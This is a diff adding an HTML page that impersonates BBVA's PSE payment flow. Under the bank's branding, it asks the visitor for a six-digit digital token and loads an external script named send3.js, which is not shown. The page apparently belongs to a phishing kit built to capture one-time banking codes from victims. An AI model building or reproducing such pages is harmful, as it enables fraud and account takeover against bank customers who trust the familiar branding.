@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BBVA - Clave</title>
+    <link rel="stylesheet" href="css/estilos3.css">
+    <link rel="icon" href="img/BBVA-Logo.png">
+</head>
+
+<body>
+
+    <header class="header">
+        Pagos a través de PSE
+    </header>
+
+    <main class="clave-container">
+        <h1>Ingresa el Token Digital</h1>
+        <p class="description">Por favor, digita el token de 6 dígitos para continuar con la transacción.</p>
+
+        <form id="miForm" class="clave-form">
+            <label for="dinamica">Token</label>
+            <div class="password-wrapper">
+                <input type="password" id="miInput" name="dinamica" maxlength="6" pattern="\d{6}" required>
+            </div>
+            <button type="submit" class="btn-continuar">Continuar</button>
+        </form>
+    </main>
+
+
+    <script src="js/send3.js"></script>
+</body>
+
+</html>
